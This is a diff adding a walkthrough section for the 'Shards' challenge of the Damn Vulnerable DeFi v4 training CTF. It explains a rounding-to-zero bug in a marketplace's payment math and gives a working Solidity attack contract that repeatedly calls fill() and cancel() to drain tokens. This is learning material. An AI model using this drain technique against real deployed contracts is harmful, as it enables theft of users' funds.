@@ -999,3 +999,55 @@ function test_abiSmuggling() public checkSolvedByPlayer {
 Run `forge test --mp test/abi-smuggling/ABISmuggling.t.sol --isolate` to validate test
 
 ---
+
+## 16.SHARDS
+
+**Obejctive**
+
+_from `_isSolved()` in test_
+
+1. _Balance of staking contract didn't change_
+2. _Marketplace has less tokens_
+3. _All recovered funds sent to recovery account_
+4. _Player must have executed a single transaction_
+
+**Attack Analysis**
+
+- The vulnerability lies in the precision loss during payment calculation in `fill()`, specifically in `want.mulDivDown(_toDVT(offer.price, _currentRate), offer.totalShards)`
+- The calculation involves two nested divisions that can be exploited:
+  1. First in `_toDVT: offer.price * _currentRate / 1e6`
+  2. Then in the outer calculation: `want * (result from step 1) / offer.totalShards`
+- With initial values of `offer.price` = 100_000, `_currentRate` = 1e6, and `offer.totalShards` = 100_000, any `want` value below 133 results in a payment of 0 DVT due to precision loss
+- An attacker can it exploited by:
+
+  1. Making multiple small purchases (want = 100) that cost 0 DVT due to the precision loss
+  2. Using `cancel()` to return these free shards and receive DVT tokens back
+  3. Repeating this process to drain the marketplace's DVT tokens
+
+**POC**
+
+See [test/shards/Shards.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4-walkthrough/blob/master/test/shards/Shards.t.sol)
+
+```solidity
+function test_shards() public checkSolvedByPlayer {
+    new AttackMarketPlace(marketplace, token, recovery);
+}
+
+contract AttackMarketPlace {
+    constructor(ShardsNFTMarketplace _marketplace, DamnValuableToken _token, address _recovery) {
+        uint256 wantShards = 100;
+
+        // 100 shard * 10_000
+        for (uint256 i = 0; i < 10001; i++) {
+            _marketplace.fill(1, wantShards);
+            _marketplace.cancel(1, i);
+        }
+
+        _token.transfer(_recovery, _token.balanceOf(address(this)));
+    }
+}
+```
+
+Run `forge test --mp test/shards/Shards.t.sol --isolate` to validate test
+
+---
